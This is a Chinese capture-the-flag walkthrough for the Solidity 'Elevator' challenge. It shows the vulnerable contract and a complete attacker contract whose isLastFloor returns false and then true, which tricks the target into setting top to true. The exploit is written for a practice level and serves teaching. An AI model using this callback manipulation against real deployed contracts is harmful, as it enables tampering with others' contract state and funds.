11. Elevator

题目描述


  • 通关条件是使 contract.top = true

  • 题目合约代码如下：

 1pragma solidity ^0.6.0;
 2
 3interface Building {
 4  function isLastFloor(uint) external returns (bool);
 5}
 6
 7
 8contract Elevator {
 9  bool public top;
10  uint public floor;
11
12  function goTo(uint _floor) public {
13    Building building = Building(msg.sender);
14
15    if (! building.isLastFloor(_floor)) {
16      floor = _floor;
17      top = building.isLastFloor(floor);
18    }
19  }
20}



解题步骤

Building接口中声明了 isLastFloor 函数，可自行编写继承该接口的合约

通关条件是使 top = ture ，则 building.isLastFloor(floor) 第一次调用需返回 false ，第二次调用返回 true

故，我们只需设法使isLastFloor函数的返回值先为false后为true即可

  1. 部署新合约，继承Building接口，实现一个能先返回false后返回true的isLastFloor函数

  2. 调用攻击函数进行题目合约中goTo函数的调用




解题代码


 1pragma solidity ^0.4.18;
 2
 3interface Building {
 4  function isLastFloor(uint) view public returns (bool);
 5}
 6
 7contract Elevator {
 8  function goTo(uint _floor) public {}
 9}
10
11contract attack is Building{
12      uint cnt=0;
13      function isLastFloor(uint) view public returns (bool){
14        if(cnt == 0){
15         cnt = 1;
16         return false;        //第一次返回false
17        }
18        else{
19            return true;    //第二次返回true
20        }
21      }
22
23      function go(address param){
24          Elevator a = Elevator(param);
25          a.goTo(1);        //攻击
26      }
27}
